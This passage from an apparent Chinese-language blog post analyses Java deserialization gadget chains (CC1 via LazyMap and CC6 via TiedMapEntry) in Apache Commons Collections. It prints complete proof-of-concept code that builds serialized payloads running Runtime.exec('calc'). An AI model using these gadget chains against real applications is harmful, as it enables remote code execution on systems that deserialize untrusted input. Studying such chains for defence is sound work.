    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过这种方法就能整个反序列化执行命令，我们就完成了。</p>
<p>大致流程图如下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720782503639-ba9b9435-7cfa-4ca7-ada8-52d8c0c58456.png"></p>
<p>这与官方给出的cc1的不相同，官方给出的如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token constant">CC1</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>criterion<span class="token punctuation">.</span></span><span class="token class-name">Order</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC_LazyMap</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
<span class="token comment">/*
	明确链子：
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
	Requires:
		commons-collections
 */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span> lazymap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Constructor</span> ctor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> invocationHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> ctor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>lazymap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> mapProxy<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>invocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> invocationHandlerProxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> ctor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>mapProxy<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        serialize(invocationHandlerProxy);</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"PocLazyMap.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"PocLazyMap.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个的流程图如下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1720782571992-6f2833a6-1703-4ec1-ba5d-6b6456ab117c.png"></p>
<p>这条链与上面的不同是利用了LazyMap这个类中的get方法中条用了transform，然后AnnotationinvocationHandler类中利用用了get方法和invoke来实现动态代理调用AnnotationinvocationHandler类中的readObject方法。最终实现链子。</p>
<h2 id="CC6链"><a href="#CC6链" class="headerlink" title="CC6链"></a>CC6链</h2><p>在jdk1.8.171之后，对AnnotationinvocationHandler进行了修改，导致了原本的那两条链子无法使用</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721533079477-a5752a51-86f6-430f-a9ff-ae2021c03524.png"></p>
<p>cc6与cc1的链子差不多，跟第二条链子特别的像，在LazyMap之前的调用链都相同，不同的就是get方法的调用，这条链使用的是TiedMapEntry中的getValue方法</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721014528706-e646bfcd-3820-4ad8-ad56-f7a76cb55bdb.png"></p>
<p>然后继续向下寻找，会发现在这个类中的hashCode方法中存在对getValue的调用：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721014599692-8fcec5d9-7c9a-425b-bf51-2a41ca1d702c.png"></p>
<p>然后就是寻找hashCode方法的调用，然后据文章所说，在HashMap的put方法调用时，会自动调用hashCode方法，到此，我们就寻找完了整个链子，可以编写poc如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span>myCC6</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span> lazymap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazymap<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> ccc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ccc<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span><span class="token string">"ccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">serialize</span><span class="token punctuation">(</span>ccc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        unserialize("MyPOC6.bin");</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"MyPOC6.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在现有的情况下进行序列化和反序列化时，会发现一个奇怪的现象，在进行序列化的时候，就会被触发：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721015230431-a9eac9a5-f9ad-4bdc-8098-976fada017bd.png"></p>
<p>我们打下断点跟进调试看看：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721023620864-1552a4c9-fe78-4b03-8d0c-8ea933e5ecd7.png"><br>可以发现的是，在put方法调用的时候也会调用hash，然后会调用hashCode:</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721024874140-12a2380c-d384-412d-bcde-697d9a77c194.png"></p>
<p>然后就会调用TiedMapEntry方法中的hashCode，从而提前完成链子，为了解决这个问题，与DNS链差不多，我们需要在put方法前先将关键值修改为一个无关紧要的值，在序列化完之后再进行一遍赋值，再put，达到在反序列化的时候进行调用。</p>
<p>修改后poc如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span>myCC6</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
